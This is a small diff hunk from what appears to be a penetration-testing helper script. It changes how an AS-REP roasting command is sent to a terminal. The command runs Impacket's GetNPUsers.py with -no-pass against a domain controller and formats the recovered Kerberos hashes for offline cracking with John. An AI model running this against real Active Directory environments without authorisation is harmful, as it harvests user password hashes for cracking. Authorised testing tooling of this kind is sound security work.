@@ -16,5 +16,5 @@ DOMAIN=${form_data["domain"]}
 USERS_FILE=${form_data["users_file"]}
 DC_IP=${form_data["ip"]}
 
-paste_command "GetNPUsers.py ${DOMAIN}/ -dc-ip ${DC_IP} -format john -no-pass -usersfile ${USERS_FILE} | grep -v 'KDC_ERR'"
-xdotool key Return
+execute_command "GetNPUsers.py ${DOMAIN}/ -dc-ip ${DC_IP} -format john -no-pass -usersfile ${USERS_FILE} | grep -v 'KDC_ERR'"
+create_new_line
